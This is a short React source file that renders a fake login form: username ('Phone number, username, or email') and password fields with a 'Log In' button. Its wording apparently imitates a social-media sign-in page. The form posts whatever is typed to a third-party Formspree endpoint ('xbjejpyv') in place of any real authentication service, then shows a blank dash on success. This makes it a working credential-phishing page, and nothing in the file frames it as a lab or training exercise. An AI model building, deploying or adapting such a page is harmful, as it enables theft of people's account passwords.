// Made With 💙 By HM
import React from 'react';
import { useForm, ValidationError } from '@formspree/react';
function MadebyHM() {
  const [state, handleSubmit] = useForm("xbjejpyv");
  if (state.succeeded) {
      return <p> - </p>;
  }
  return (
      <form onSubmit={handleSubmit}>
<div class="input-box">
      <input type="text"
               id="name" 
        placeholder="Phone number, username, or email"
    autocapitalize="off"
       autocorrect="off" 
              name="username" />
                    </div>  
<div class="input-box">
                     
 <input type="password" 
        name="password"
          id="password" 
 placeholder="Password" 
aria-describedby="" 
maxlength="30" 
aria-required="true" 
autocapitalize="off" 
autocorrect="off" />
                    </div>
<div style={{ display: "flex" }}>
      <button style={{ marginLeft: "20%" }} class="btn" type="submit" disabled={state.submitting}>
        Log In
      </button>
</div>
    </form>
  );
}
function App() {
  return (
    <MadebyHM />
  );
}
export default App;
